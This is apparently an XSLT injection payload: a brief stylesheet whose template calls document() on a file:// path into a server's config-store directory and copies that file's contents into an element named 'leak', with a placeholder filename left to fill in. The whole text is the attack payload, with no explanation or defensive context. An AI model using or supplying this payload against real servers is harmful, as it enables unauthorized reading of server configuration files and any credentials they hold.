<?xml version="1.0"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  <xsl:output method="xml"/>
  <xsl:template match="/"><leak><xsl:copy-of select="document('file:///opt/out/instance/server/default/data/config-store/REPLACE_FILENAME')"/></leak></xsl:template>
</xsl:stylesheet>
